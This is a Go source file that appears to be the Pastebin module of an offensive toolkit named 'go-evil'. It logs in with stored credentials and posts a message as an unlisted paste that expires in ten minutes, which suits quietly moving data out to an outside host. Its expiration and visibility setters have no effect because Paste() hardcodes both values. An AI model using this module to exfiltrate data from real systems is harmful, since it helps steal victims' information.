package pastebin

import (
	"github.com/TwiN/go-pastebin"
	run_time "github.com/s9rA16Bf4/go-evil/utility/variables/runtime"
	"github.com/s9rA16Bf4/notify_handler/go/notify"
)

type paste_t struct {
	username   string
	password   string
	token      string
	titel      string
	message    string
	expiration string
	visibility string
	returnKey  bool // Should we return the pastebin key-url? If yes then it will be added to a runtime variable
}

var c_paste paste_t

func Set_username(user string) {
	user = run_time.Check_if_variable(user)
	c_paste.username = user
}
func Set_password(pass string) {
	pass = run_time.Check_if_variable(pass)
	c_paste.password = pass
}
func Set_token(token string) {
	token = run_time.Check_if_variable(token)
	c_paste.token = token
}
func Set_titel(titel string) {
	titel = run_time.Check_if_variable(titel)
	c_paste.titel = titel
}
func Set_content(msg string) {
	msg = run_time.Check_if_variable(msg)
	c_paste.message = msg
}
func Set_expiration(expiration string) {
	expiration = run_time.Check_if_variable(expiration)
	c_paste.expiration = expiration
}
func Set_visibility(visibility string) {
	visibility = run_time.Check_if_variable(visibility)
	c_paste.visibility = visibility
}
func Set_key(new_value string) {
	new_value = run_time.Check_if_variable(new_value)

	if new_value == "true" {
		c_paste.returnKey = true
	} else if new_value == "false" {
		c_paste.returnKey = false
	} else {
		notify.Error("Unknown key value "+new_value, "pastebin.Set_key()")
	}
}

func Paste() {
	if c_paste.username == "" || c_paste.password == "" || c_paste.token == "" {
		notify.Error("Pastebin hasn't been setup correctly! Make sure that username, password and token is assigned", "pastebin.Paste()")
	}

	client, err := pastebin.NewClient(c_paste.username, c_paste.password, c_paste.token)
	if err != nil {
		notify.Error(err.Error(), "pastebin.Paste()")
	}

	if c_paste.message == "" {
		c_paste.message = "No message"
	}
	if c_paste.titel == "" {
		c_paste.titel = "No titel"
	}

	pasteKey, err := client.CreatePaste(pastebin.NewCreatePasteRequest(c_paste.titel, c_paste.message, pastebin.ExpirationTenMinutes, pastebin.VisibilityUnlisted, "go"))
	if err != nil {
		notify.Error(err.Error(), "pastebin.Paste()")
	}

	if c_paste.returnKey { // Save the key only if the user requested it
		run_time.Set_variable(pasteKey)
	}
}
